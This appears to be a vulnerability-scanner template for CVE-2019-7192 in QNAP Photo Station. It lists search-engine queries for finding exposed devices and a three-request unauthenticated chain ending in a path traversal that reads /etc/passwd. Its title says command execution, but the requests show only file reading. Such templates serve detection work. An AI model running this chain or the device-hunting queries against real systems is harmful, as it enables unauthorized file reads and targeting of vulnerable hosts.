id: CVE-2019-7192

info:
  name: QNAP QTS and Photo Station 6.0.3 - Remote Command Execution
  author: Hzllaga
  severity: critical
  verified: false
  description: |
    QNAP PhotoStation before 4.3.4 allows unauthenticated users to read arbitrary files via the slideshow.php component.
    shodan: 'Content-Length: 580 "http server 1.0"' || http.title:"photo station" || http.title:"qnap" || 'content-length: 580 "http server 1.0"'
    fofa: title="photo station" || title="qnap"
    google: intitle:"qnap" || intitle:"photo station"
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2019-7192
  tags: cve,cve2019,qnap,photostation,rce
  created: 2023/08/10

rules:
  r0:
    request:
      method: POST
      path: /photo/p/api/album.php
      body: a=setSlideshow&f=qsamplealbum
    expression: response.status == 200
    output:
      search: '"<output>(?P<album_id>.*?)</output>".bsubmatch(response.body)'
      album_id: search["album_id"]
  r1:
    request:
      method: GET
      path: /photo/slideshow.php?album={{album_id}}
    expression: response.status == 200
    output:
      search: '"encodeURIComponent\\(\\''(?P<access_code>.*?)\\''\\)".bsubmatch(response.body)'
      access_code: search["access_code"]
  r2:
    request:
      method: POST
      path: /photo/p/api/video.php
      body: album={{album_id}}&a=caption&ac={{access_code}}&f=UMGObv&filename=.%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
    expression: response.status == 200 && response.body.bcontains(b"admin:x:0:0")
expression: r0() && r1() && r2()
